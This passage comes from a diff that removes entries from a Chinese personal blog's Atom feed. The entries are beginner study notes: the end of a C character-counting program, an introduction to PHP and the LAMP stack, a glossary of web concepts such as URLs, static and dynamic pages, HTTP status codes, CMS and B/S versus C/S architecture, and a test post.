&amp;&amp; ch &lt;= <span class="string">&#x27;Z&#x27;</span> || ch &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">zhimu++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">shuzhi++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">kongge++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">other++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;字母数为%d\n数字数为%d\n空格数为%d\n其他字符个数为%d\n&quot;</span>,zhimu,shuzhi,kongge,other);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/27/QsZG5cx6UCBEq2p.png"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;收藏&quot;&gt;&lt;a href=&quot;#收藏&quot; class=&quot;headerlink&quot; title=&quot;收藏&quot;&gt;&lt;/a&gt;收藏&lt;/h1&gt;&lt;h6 id=&quot;调试了好久才成功的代码&quot;&gt;&lt;a href=&quot;#调试了好久才成功的代码&quot; class=&quot;headerlink&quot; title=&quot;调试了</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="http://wifi-0x.github.io/2021/10/27/PHP(1)/"/>
-    <id>http://wifi-0x.github.io/2021/10/27/PHP(1)/</id>
-    <published>2021-10-27T14:44:15.613Z</published>
-    <updated>2021-10-27T14:44:15.792Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP(1)"></a>PHP(1)</h1><h3 id="对PHP的理解"><a href="#对PHP的理解" class="headerlink" title="对PHP的理解:"></a>对PHP的理解:</h3><p>全称为Hypertext Preprocessor，即超文本预处理器</p><p>PHP最初是个人主页（Personal Home Page）的缩写</p><p>是一种在服务器端运行的开源的脚本语言</p><p><img src="https://i.loli.net/2021/10/24/fFiravWgTluE7Xe.png"></p><h4 id="黄金组合"><a href="#黄金组合" class="headerlink" title="黄金组合"></a>黄金组合</h4><p><strong>LAMP</strong>组合（<u><strong>Linux,Apache,MySQL,PHP</strong></u>),这四个产品都是公开源代码的产品，无版权之争。 </p><p><em>php</em>是一门语言，用来做业务逻辑</p><p><em>Apache</em>为<em>php</em>提供了运行环境</p><p><em>mysql</em>数据库用来存储数据</p><h6 id="wapm组合：window-apche-mysql-php"><a href="#wapm组合：window-apche-mysql-php" class="headerlink" title="wapm组合：window+apche+mysql+php"></a>wapm组合：window+apche+mysql+php</h6>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;PHP-1&quot;&gt;&lt;a href=&quot;#PHP-1&quot; class=&quot;headerlink&quot; title=&quot;PHP(1)&quot;&gt;&lt;/a&gt;PHP(1)&lt;/h1&gt;&lt;h3 id=&quot;对PHP的理解&quot;&gt;&lt;a href=&quot;#对PHP的理解&quot; class=&quot;headerlink&quot; titl</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="http://wifi-0x.github.io/2021/10/24/%E4%B8%93%E4%B8%9A%E5%90%8D%E7%A7%B0&amp;%E6%A6%82%E5%BF%B5/"/>
-    <id>http://wifi-0x.github.io/2021/10/24/%E4%B8%93%E4%B8%9A%E5%90%8D%E7%A7%B0&amp;%E6%A6%82%E5%BF%B5/</id>
-    <published>2021-10-24T15:54:07.579Z</published>
-    <updated>2021-10-25T09:22:06.665Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="专业名词-amp-概念"><a href="#专业名词-amp-概念" class="headerlink" title="专业名词&amp;概念"></a>专业名词&amp;概念</h1><p>[TOC]</p><h3 id="URL（网址）路径"><a href="#URL（网址）路径" class="headerlink" title="URL（网址）路径"></a>URL（网址）路径</h3><p>如：内卷的代价(<a href="https://www.bilibili.com/video/BV1qf4y1g7yG?spm_id_from=333.851.b_7265636f6d6d656e64.4">https://www.bilibili.com/video/BV1qf4y1g7yG?spm_id_from=333.851.b_7265636f6d6d656e64.4</a>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">统一资源定位符 (uniform resource locator, url) 是用于完整地描述internet上网页和其他资源的地址的一种标识方法。 internet上的每一个网页都具有一个唯一的名称标识，通常称之为url地址，这种地址可以是本地磁盘，也可以是局域网上的某一台计算机，更多的是internet上的站点。简单地说，url就是web地址，俗称“网址”。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（协议）：//（主机名）/（端口号）/（文件名）/（文件路径） </span><br><span class="line">有两种超文本传送协议格式 </span><br><span class="line">mms </span><br><span class="line">http </span><br><span class="line">而后面的拓展名 是根据文件的类型来定义的 </span><br><span class="line">详细格式为： </span><br><span class="line">&#123;协议&#125;：//&#123;用户名&#125;:&#123;密码&#125;@&#123;主机名&#125;:&#123;端口号&#125;/&#123;路径&#125;/&#123;文件&#125;?&#123;参数&#125;</span><br></pre></td></tr></table></figure><h3 id="静态页面："><a href="#静态页面：" class="headerlink" title="静态页面："></a>静态页面：</h3><p><em><strong>简单来说</strong></em><em>就是</em>**服务器不执行的页面</p><p><strong>仔细地说就是</strong>无需经过服务器的编译，直接加载到客户浏览器上显示出来；占服务器空间，不能自主更新页面，每个网页都是一个独立的文件。静态页面一般是.html .shtml .htm 结尾，URL路径没有特殊符号如？% 等，无需加载后台程序 无需获取后台数据库，<u>用户只能在网页中浏览不能做任何的数据交换</u></p><p><strong>优点：</strong></p><p>1、访问速度快</p><p>2、内容相对稳定，比较容易被搜索引擎检索</p><p><strong>缺点：</strong></p><p>1、无数据库的支持，在网站制作和维护方面工作量较大；</p><p>2、交互性较差，在功能方面有较大的限制；</p><h3 id="动态页面："><a href="#动态页面：" class="headerlink" title="动态页面："></a>动态页面：</h3><p><strong>简单来说</strong>服务器执行的页面</p><p><strong>不简单地说</strong>动态页面一般指动态获取数据库查询，URL路径中包含特殊符号如 ？%等，例如淘宝网宝贝的筛选等。</p><p><img src="https://i.loli.net/2021/10/25/K5z9M2gpfBXTNws.jpg"></p><p>采用数据库的开发模式</p><p><strong>优点：</strong></p><p>1、可以实现更多的功能，如登录、注册、用户管理、订单管理等；</p><p><strong>缺点：</strong></p><p>1、在访问速度上不占优势</p><p>先获得用户指令，然后网页拿着指令到数据库找和指令对应的数据，然后传递给服务器，通过服务器的编译生成html代码，最后传递给用户浏览器。</p><p>这一过程需要几秒的时间，访问人数一多，加载速度就会变慢，对于服务器来说是一种负担；</p><p>2、在搜索引擎收录方面不占优势</p><p>动态页面是经过用户输入指令后才形成的页面，实际上并不存在这个页面；而搜索引擎只会抓取现成的。</p><h3 id="html"><a href="#html" class="headerlink" title="html"></a><strong>html</strong></h3><p>html文件就是正常见到的网页格式的文件，一般这种文件到了电脑上之后，就会变成默认浏览器的图标，就是说这个文件会使用这个浏览器打开。</p><p>　　HTML称为超文本标记语言，是一种标识性的语言。它包括一系列标签，通过这些标签可以<strong>将网络上的文档格式统一</strong>，使分散的Internet资源连接为一个逻辑整体。HTML文本是由HTML命令组成的描述性文本，HTML命令可以说明文字，图形、动画、声音、表格、链接等。</p><h3 id="超文本"><a href="#超文本" class="headerlink" title="超文本"></a>超文本</h3><p>　　超文本*<u>是一种组织信息的方式</u>*，它<strong>通过超级链接方法将文本中的文字、图表与其他信息媒体相关联</strong>。这些相互关联的信息媒体可能在同一文本中，也可能是其他文件，或是地理位置相距遥远的某台计算机上的文件。这种组织信息方式将分布在不同位置的信息资源用随机方式进行连接，为人们查找，检索信息提供方便。</p><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p><img src="https://i.loli.net/2021/10/25/gU8E4OS9QzCyqeB.png"></p><ul><li><table><thead><tr><th align="center">返回的状态码：</th></tr></thead><tbody><tr><td align="center">200表示成功</td></tr><tr><td align="center">403访问被决绝</td></tr><tr><td align="center">404页面没有找到</td></tr></tbody></table></li></ul><p><img src="https://i.loli.net/2021/10/25/U6ZuQnfAi439G1O.png"></p><p><img src="https://i.loli.net/2021/10/25/tJaNsUYvG5fwZbx.png"></p><h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><p>就是一个名字</p><h3 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h3><p><strong>CMS简单的说就是制作和管理网页用的一个工具软件</strong> 现在CMS建站系统非常的多 帝国、科讯等。<strong>就是内容管理系统..说的简单点..其实就是一个网站的整体模板。</strong>每种CMS的界面和操作规则都不太一样 基本都属于二次开发 让一些有基础但又称不上高手的人 用CMS建站系统建立并管理网站（代码多少得懂点）<br>注：基本上用CMS建立的网站都是在软件给出的效果中选择 不能随心所欲的设计（随心所欲的设计得是那些高手才行的 用CMS可以满足正常的建站要求）</p><h3 id="客户端和服务器端"><a href="#客户端和服务器端" class="headerlink" title="客户端和服务器端"></a>客户端和服务器端</h3><p>客户端：浏览者</p><p>服务器端：给浏览者提供</p><p><img src="https://i.loli.net/2021/10/25/F5RWLd3Y8ZKrbpo.jpg"></p><p><strong>红色方块</strong>为端口，里面的数字是端口号</p><h3 id="BS架构和CS架构"><a href="#BS架构和CS架构" class="headerlink" title="BS架构和CS架构"></a>BS架构和CS架构</h3><p>网络系统软件开发包括B/S与C/S两种结构都可以进行同样的业务处理</p><h4 id="BS-通过浏览器去访问服务器"><a href="#BS-通过浏览器去访问服务器" class="headerlink" title="**BS:**通过浏览器去访问服务器"></a>**BS:**通过浏览器去访问服务器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b:browser(浏览器)</span><br><span class="line">s：sever（服务器）</span><br></pre></td></tr></table></figure><p>所以的web都是BS架构的</p><p>特点：</p><p>1 不需要下载特定的客户端（方便）</p><p>2 和服务器进行HTTP协议</p><p>3 它将所以的数据储存在服务器上</p><p>优缺点：</p><p>1.B/S结构维护升级更方便</p><p>2.成本低，不用开发特定的客户端</p><p>3.数据相对安全，因为已经储存在服务器上</p><p>1，应用服务器运行数据复合较重</p><h4 id="CS：特定的客户端（client-去连接服务器-server"><a href="#CS：特定的客户端（client-去连接服务器-server" class="headerlink" title="CS：特定的客户端（client)去连接服务器(server)"></a><strong>CS</strong>：特定的客户端（client)去连接服务器(server)</h4><p>如：王者荣耀     QQ</p><p>特点：</p><p>1 C/S软件通常需要特定的客户端来使用。</p><p>2 可以通过任意协议进行通信。</p><p>3 它的客户端有数据处理和存储的能力，可以把应用程序的计算和数据分配在客户端和服务器端。</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;专业名词-amp-概念&quot;&gt;&lt;a href=&quot;#专业名词-amp-概念&quot; class=&quot;headerlink&quot; title=&quot;专业名词&amp;amp;概念&quot;&gt;&lt;/a&gt;专业名词&amp;amp;概念&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
-&lt;h3 id=&quot;URL（网址）路径&quot;&gt;&lt;a hr</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="http://wifi-0x.github.io/2021/10/24/%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8B/"/>
-    <id>http://wifi-0x.github.io/2021/10/24/%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8B/</id>
-    <published>2021-10-24T03:02:57.893Z</published>
-    <updated>2021-10-24T03:02:58.186Z</updated>
-    
-    <content type="html"><![CDATA[<p>测试一下</p><p><img src="https://i.loli.net/2021/10/24/sdUu2WRB7rQahID.jpg"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;测试一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/10/24/sdUu2WRB7rQahID.jpg&quot;&gt;&lt;/p&gt;
-</summary>
       
     
     
